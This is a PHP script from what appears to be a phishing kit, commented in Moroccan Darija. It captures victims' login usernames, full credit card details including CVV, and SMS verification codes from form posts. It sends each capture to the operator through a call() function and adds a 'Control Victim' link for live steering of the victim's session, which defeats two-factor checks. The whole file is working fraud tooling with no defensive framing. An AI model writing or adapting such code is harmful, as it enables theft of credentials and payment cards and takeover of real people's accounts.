<?php 
require '../main.php';

// Detecter l-URL automatique dial l-folder
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$host = $_SERVER['HTTP_HOST'];
$directory = dirname($_SERVER['PHP_SELF']);
$my_site = $protocol . "://" . $host . $directory;

function update_status($ip, $status) {
    file_put_contents("status_" . $ip . ".txt", $status);
}

// 1. User/Pass
if(isset($_POST['user'])){
    $msg = "👤 **LOGIN LOG**\n🌐 IP: $v_ip\nUser: ".$_POST['user']."\n\n🎮 **Control Victim:**\n$my_site/control.php?ip=$v_ip";
    call($msg);
    update_status($v_ip, "wait");
    header("Location: wait.php");
    exit();
}

// 2. Card Details
if(isset($_POST['name'])){
    $msg = "💳 **CC LOG**\n🌐 IP: $v_ip\nName: ".$_POST['name']."\nCC: ".$_POST['cc']."\nExp: ".$_POST['exp']."\nCVV: ".$_POST['cvv']."\n\n🎮 **Control Victim:**\n$my_site/control.php?ip=$v_ip";
    call($msg);
    update_status($v_ip, "wait");
    header("Location: wait.php");
    exit();
}

// 3. SMS Code
if(isset($_POST['sms'])){
    $msg = "💬 **SMS LOG**\n🌐 IP: $v_ip\nCode: ".$_POST['sms']."\n\n🎮 **Control Victim:**\n$my_site/control.php?ip=$v_ip";
    call($msg);
    update_status($v_ip, "wait");
    header("Location: wait.php");
    exit();
}
?>